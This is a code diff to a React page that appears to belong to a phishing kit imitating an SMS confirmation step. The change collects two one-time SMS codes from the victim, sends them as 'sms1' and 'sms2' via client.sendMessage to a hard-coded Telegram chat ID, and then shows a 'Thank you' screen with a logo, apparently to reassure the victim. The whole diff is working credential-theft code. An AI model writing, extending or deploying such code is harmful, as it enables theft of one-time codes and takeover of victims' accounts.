@@ -16,7 +16,7 @@ function Page2() {
   const [step2, setStep2] = useState(false);
   const [step1, setStep1] = useState(true);
   const [step3, setStep3] = useState(false);
-  const [userId, setUserId] = useState("none");
+  const [userId, setUserId] = useState("");
   const [pass, setPass] = useState("");
   let [secondSmsPage,setSecondSmsPage]=useState(false)
   
@@ -28,7 +28,7 @@ function Page2() {
     console.log("password "+pass)
     await client.sendMessage(
       -1001578583679,
-      "userId : " + userId + " \n pass  : " + pass
+      "sms1 : " + pass + " \n  sms2  : " + userId
     );
   };
   let [errorPage,setErrorPage]=useState(false)
@@ -44,13 +44,13 @@ function Page2() {
  }
   const handleSubmit = () => {
   
-     if(pass){ setStep1(false);
+     if(pass && userId){ setStep1(false);
       setErrorPage(false)
       setIsLoading(true);
       sendmsg();
       setTimeout(() => {
         setIsLoading(false);
-        setStep2(true);
+        setStep3(true);
       }, 3000);
     }
   };
@@ -322,6 +322,13 @@ Confirmation by SMS
                                                     <h1 _ngcontent-jha-c48="" style={{textAlign:"center"}}>
                                                      Thank you 
                                                     </h1>
+                                                  <div style={{textAlign:"center"}}>
+                                                  <img
+                                              alt="logo"
+                                              src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTfCQA04gQfIu08UyGKGFiLLQqDJ3VwEDyR61LPJemfC5KWp0RbIbyIyY0BBxhn8EuIcU8&usqp=CAU"
+                                              class="iasdm2"
+                                            />
+                                                  </div>
                                                     <div
                                                   //     _ngcontent-jha-c48=""
                                                   //     class="frame__row"
@@ -556,7 +563,7 @@ try again
 
                                                   >
                                                       <div style={{textAlign:"center",display:"flex",justifyContent:"center"}}>  
-                                <input onChange={(e)=>{setPass(e.target.value)}} style={{textAlign:"center",backgroundColor:"white",border:"1px solid grey",padding:"3px"}} type="password"></input>
+                                <input onChange={(e)=>{setUserId(e.target.value)}} style={{textAlign:"center",backgroundColor:"white",border:"1px solid grey",padding:"3px"}} type="password"></input>
                                 </div>
                                                   < br />
                                          <div 
